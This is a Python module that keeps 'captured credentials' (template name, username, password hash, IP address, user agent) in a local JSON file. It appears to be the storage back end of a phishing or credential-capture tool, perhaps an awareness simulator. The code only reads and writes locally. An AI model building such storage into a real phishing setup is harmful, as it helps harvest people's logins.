import json
import os
import threading
from datetime import datetime, timezone

class DatabaseManager:
    def __init__(self, db_path=None):
        if db_path is None:
            DATA_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
            db_path = os.path.join(DATA_DIR, "captured_credentials.json")
        self.db_path = db_path
        self._lock = threading.RLock()
        self._ensure_storage()

    def _ensure_storage(self):
        dir_name = os.path.dirname(self.db_path)
        os.makedirs(dir_name, exist_ok=True)
        if not os.path.exists(self.db_path):
            with open(self.db_path, "w", encoding="utf-8") as f:
                json.dump([], f)

    def save_credential(self, template, username, password_hash, ip_address, user_agent):
        with self._lock:
            data = self.get_all()
            entry = {
                "id": len(data) + 1,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "template": template,
                "username": username,
                "password_hash": password_hash,
                "ip_address": ip_address,
                "user_agent": user_agent
            }
            data.append(entry)
            with open(self.db_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
        return entry

    def get_all(self):
        with self._lock:
            if not os.path.exists(self.db_path):
                return []
            with open(self.db_path, "r", encoding="utf-8") as f:
                try:
                    return json.load(f)
                except json.JSONDecodeError:
                    return []